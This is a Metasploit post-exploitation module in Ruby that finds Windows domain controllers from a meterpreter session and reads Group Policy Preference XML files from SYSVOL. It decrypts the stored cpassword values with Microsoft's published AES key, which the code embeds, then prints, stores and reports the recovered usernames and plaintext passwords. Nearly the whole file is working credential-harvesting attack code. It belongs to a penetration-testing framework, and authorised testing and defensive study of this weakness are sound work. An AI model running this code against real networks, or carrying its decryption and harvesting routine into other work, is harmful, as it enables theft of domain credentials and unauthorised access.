##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rexml/document'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/priv'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
      'Description'   => %q{
        This module enumerates the victim machine's domain controller and
        connects to it via SMB. It then looks for Group Policy Preference XML
        files containing local user accounts and passwords and decrypts them
        using Microsofts public AES key.

        Tested on WinXP SP3 Client and Win2k8 R2 DC.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>[
        'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
        'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
        'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
        'theLightCosine',
        'mubix' #domain/dc enumeration code
        ],
      'References'    =>
        [
          ['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
      OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
  end

  def run
    group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
    group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
    service_path = "MACHINE\\Preferences\\Services\\Services.xml"
    printer_path = "USER\\Preferences\\Printers\\Printers.xml"
    drive_path = "USER\\Preferences\\Drives\\Drives.xml"
    datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
    datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
    task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
    task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

    domains = []
    basepaths = []
    fullpaths = []
    cached_domain_controller = nil

    print_status "Checking locally..."
    locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
    unless locals.blank?
      basepaths << locals
      print_good "Group Policy Files found locally"
    end

    # If user supplied domains this implicitly cancels the ALL flag.
    if datastore['ALL'] and datastore['DOMAINS'].blank?
      print_status "Enumerating Domains on the Network..."
      domains = enum_domains
      domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
    end

    # Add user specified domains to list.
    unless datastore['DOMAINS'].blank?
      if datastore['DOMAINS'].match(/\./)
        print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
        return
      end
      user_domains = datastore['DOMAINS'].split(' ')
      user_domains = user_domains.map {|x| x.upcase}
      print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
      user_domains.each{|ud| domains << ud}
    end

    # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
    # If user supplied domains we do not wish to enumerate registry retrieved domains.
    if locals.blank? && user_domains.blank?
      print_status "Enumerating domain information from the local registry..."
      domains << get_domain_reg
    end

    domains.flatten!
    domains.compact!
    domains.uniq!

    # Dont check registry if we find local files.
    cached_dc = get_cached_domain_controller if locals.blank?

    domains.each do |domain|
      dcs = enum_dcs(domain)
      dcs = [] if dcs.nil?

      # Add registry cached DC for the test case where no DC is enumerated on the network.
      if !cached_dc.nil? && (cached_dc.include? domain)
        dcs << cached_dc
      end

      next if dcs.blank?
      dcs.uniq!
      tbase = []
      dcs.each do |dc|
        print_status "Searching for Policy Share on #{dc}..."
        tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
        #If we got a basepath from the DC we know that we can reach it
        #All DCs on the same domain should be the same so we only need one
        unless tbase.blank?
          print_good "Found Policy Share on #{dc}"
          basepaths << tbase
          break
        end
      end
    end

    basepaths.flatten!
    basepaths.compact!
    print_status "Searching for Group Policy XML Files..."
    basepaths.each do |policy_path|
      fullpaths << find_path(policy_path, group_path)
      fullpaths << find_path(policy_path, group_path_user)
      fullpaths << find_path(policy_path, service_path)
      fullpaths << find_path(policy_path, printer_path)
      fullpaths << find_path(policy_path, drive_path)
      fullpaths << find_path(policy_path, datasource_path)
      fullpaths << find_path(policy_path, datasource_path_user)
      fullpaths << find_path(policy_path, task_path)
      fullpaths << find_path(policy_path, task_path_user)
    end
    fullpaths.flatten!
    fullpaths.compact!
    fullpaths.each do |filepath|
      tmpfile = gpp_xml_file(filepath)
      parse_xml(tmpfile) if tmpfile
    end

  end

  def get_basepaths(base)
    locals = []
    begin
      session.fs.dir.foreach(base) do |sub|
        next if sub =~ /^(\.|\.\.)$/
        tpath = "#{base}\\#{sub}\\Policies"
        begin
          session.fs.dir.foreach(tpath) do |sub2|
            next if sub =~ /^(\.|\.\.)$/
            locals << "#{tpath}\\#{sub2}\\"
          end
        rescue Rex::Post::Meterpreter::RequestError => e
          print_error "Could not access #{tpath}  : #{e.message}"
        end
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "Error accessing #{base} : #{e.message}"
    end
    return locals
  end

  def find_path(path, xml_path)
    xml_path = "#{path}#{xml_path}"
    begin
      return xml_path if client.fs.file.stat(xml_path)
    rescue Rex::Post::Meterpreter::RequestError => e
      # No permissions for this specific file.
      return nil
    end
  end

  def gpp_xml_file(path)
    begin
      groups = client.fs.file.new(path,'r')
      until groups.eof
        data = groups.read
      end

      spath = path.split('\\')
      retobj = {
        :dc     => spath[2],
        :path   => path,
        :xml    => REXML::Document.new(data).root
      }
      if spath[4] == "sysvol"
        retobj[:domain] = spath[5]
      else
        retobj[:domain] = spath[4]
      end
      return retobj
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "Received error code #{e.code} when reading #{path}"
      return nil
    end
  end

  def parse_xml(xmlfile)
    mxml = xmlfile[:xml]
    print_status "Parsing file: #{xmlfile[:path]} ..."
    filetype = xmlfile[:path].split('\\').last()
    mxml.elements.to_a("//Properties").each do |node|
      epassword = node.attributes['cpassword']
      next if epassword.to_s.empty?
      pass = decrypt(epassword)

      user = node.attributes['runAs'] if node.attributes['runAs']
      user = node.attributes['accountName'] if node.attributes['accountName']
      user = node.attributes['username'] if node.attributes['username']
      user = node.attributes['userName'] if node.attributes['userName']
      user = node.attributes['newName'] unless node.attributes['newName'].blank?
      changed = node.parent.attributes['changed']

      # Printers and Shares
      path = node.attributes['path']

      # Datasources
      dsn = node.attributes['dsn']
      driver = node.attributes['driver']

      # Tasks
      app_name = node.attributes['appName']

      # Services
      service = node.attributes['serviceName']

      # Groups
      expires = node.attributes['expires']
      never_expires = node.attributes['neverExpires']
      disabled = node.attributes['acctDisabled']

      table = Rex::Ui::Text::Table.new(
        'Header'     => 'Group Policy Credential Info',
        'Indent'     => 1,
        'SortIndex'  => -1,
        'Columns'    =>
        [
          'Name',
          'Value',
        ]
      )

      table << ["TYPE", filetype]
      table << ["USERNAME", user]
      table << ["PASSWORD", pass]
      table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
      table << ["DOMAIN", xmlfile[:domain] ]
      table << ["CHANGED", changed]
      table << ["EXPIRES", expires] unless expires.blank?
      table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
      table << ["DISABLED", disabled] unless disabled.blank?
      table << ["PATH", path] unless path.blank?
      table << ["DATASOURCE", dsn] unless dsn.blank?
      table << ["DRIVER", driver] unless driver.blank?
      table << ["TASK", app_name] unless app_name.blank?
      table << ["SERVICE", service] unless service.blank?

      node.elements.each('//Attributes//Attribute') do |dsn_attribute|
        table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
      end

      print_good table.to_s

      if datastore['STORE']
        stored_path = store_loot('windows.gpp.xml', 'text/plain', session, xmlfile[:xml], filetype, xmlfile[:path])
        print_status("XML file saved to: #{stored_path}")
      end

      report_creds(user,pass) unless disabled and disabled == '1'
    end
  end

  def report_creds(user, pass)
    if session.db_record
      source_id = session.db_record.id
    else
      source_id = nil
    end

    report_auth_info(
      :host  => session.sock.peerhost,
      :port => 445,
      :sname => 'smb',
      :proto => 'tcp',
      :source_id => source_id,
      :source_type => "exploit",
      :user => user,
      :pass => pass)
  end

  def decrypt(encrypted_data)
    padding = "=" * (4 - (encrypted_data.length % 4))
    epassword = "#{encrypted_data}#{padding}"
    decoded = Rex::Text.decode_base64(epassword)

    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
    aes.decrypt
    aes.key = key
    plaintext = aes.update(decoded)
    plaintext << aes.final
    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

    return pass
  end

  def enum_domains
    domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
    buffersize = 500
    result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
    # Estimate new buffer size on percentage recovered.
    percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
    if percent_found > 0
      buffersize = (buffersize/percent_found).to_i
    else
      buffersize += 500
    end

    while result['return'] == 234
      buffersize = buffersize + 500
      result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
    end

    count = result['totalentries']
    print_status("#{count} Domain(s) found.")
    startmem = result['bufptr']

    base = 0
    domains = []

    if count == 0
      return domains
    end

    mem = client.railgun.memread(startmem, 8*count)

    count.times do |i|
        x = {}
        x[:platform] = mem[(base + 0),4].unpack("V*")[0]
        nameptr = mem[(base + 4),4].unpack("V*")[0]
        x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
        domains << x[:domain]
        base = base + 8
    end

    domains.uniq!
    print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
    return domains
  end

  def enum_dcs(domain)
    # Prevent crash if FQDN domain names are searched for or other disallowed characters:
    # http://support.microsoft.com/kb/909264 \/:*?"<>|
    if domain =~ /[:\*?"<>\\\/.]/
      print_error("Cannot enumerate domain name contains disallowed characters: #{domain}")
      return nil
    end

    print_status("Enumerating DCs for #{domain} on the network...")
    domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
    buffersize = 500
    result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
    while result['return'] == 234
      buffersize = buffersize + 500
      result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
    end
    if result['totalentries'] == 0
      print_error("No Domain Controllers found for #{domain}")
      return nil
    end

    count = result['totalentries']
    startmem = result['bufptr']

    base = 0
    mem = client.railgun.memread(startmem, 8*count)
    hostnames = []
    count.times{|i|
      t = {}
      t[:platform] = mem[(base + 0),4].unpack("V*")[0]
      nameptr = mem[(base + 4),4].unpack("V*")[0]
      t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
      base = base + 8
      print_good "DC Found: #{t[:dc_hostname]}"
      hostnames << t[:dc_hostname]
    }
    return hostnames
  end

  # We use this for the odd test case where a DC is unable to be enumerated from the network
  # but is cached in the registry.
  def get_cached_domain_controller
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
      v_name = "DCName"
      dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
      print_status "Retrieved DC #{dc} from registry"
      return dc
    rescue
      print_status("No DC found in registry")
    end
  end

  def get_domain_reg
    locations = []
    # Lots of redundancy but hey this is quick!
    locations << ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\", "Domain"]
    locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "DefaultDomainName"]
    locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]

    domains = []

    # Pulls cached domains from registry
    domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
    if domain_cache
      domain_cache.each { |ud| domains << ud }
    end

    locations.each do |location|
      begin
        subkey = location[0]
        v_name = location[1]
        domain = registry_getvaldata(subkey, v_name)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error "Received error code #{e.code} - #{e.message}"
      end

      unless domain.blank?
        domain_parts = domain.split('.')
        domains << domain.split('.').first.upcase unless domain_parts.empty?
      end
    end

    domains.uniq!
    print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"

    return domains
  end
end
